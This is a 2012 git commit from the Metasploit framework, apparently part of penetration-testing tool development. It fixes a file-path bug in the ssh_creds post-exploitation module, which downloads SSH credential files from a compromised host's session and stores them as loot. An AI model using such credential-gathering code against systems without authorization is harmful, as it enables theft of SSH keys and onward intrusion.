66fa56cc49fc1c4a220cc61902cc26fc29301b79
Gregory Man <man.gregory@gmail.com>
2012-02-22 15:16:11 +0200

    Fixed post/multi/gather/ssh_creds to work with shell session

--- modules/post/multi/gather/ssh_creds.rb
+++ modules/post/multi/gather/ssh_creds.rb
@@ -181,7 +181,7 @@ class Metasploit3 < Msf::Post
 				files.each_line do |file|
 					file.chomp!
 					print_good("Downloading #{path}/#{file}")
-					data = read_file(file)
+					data = read_file("#{path}/#{file}")
 					file = file.split('/').last
 					store_loot("ssh.#{file}", "text/plain", session, data, "ssh_#{file}", "OpenSSH #{file} File")
 				end
